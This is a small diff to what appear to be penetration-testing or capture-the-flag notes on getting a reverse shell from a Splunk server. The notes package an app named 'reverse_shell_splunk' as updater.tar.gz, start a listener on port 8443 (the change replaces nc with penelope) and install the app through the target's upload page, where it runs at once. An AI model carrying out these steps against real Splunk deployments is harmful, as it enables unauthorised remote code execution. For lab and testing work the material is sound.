@@ -210,7 +210,7 @@ cd reverse_shell_splunk/reverse_shell_splunk/
 cd ..
 tar -cvzf updater.tar.gz reverse_shell_splunk/
 
-nc -lvnp 8443
+penelope -p 8443
 
 # NOTE: uploading the app, causes it run immediately; ensure `nc` is running
 # From http://<TARGET>/en-US/manager/search/apps/local > Install app from file
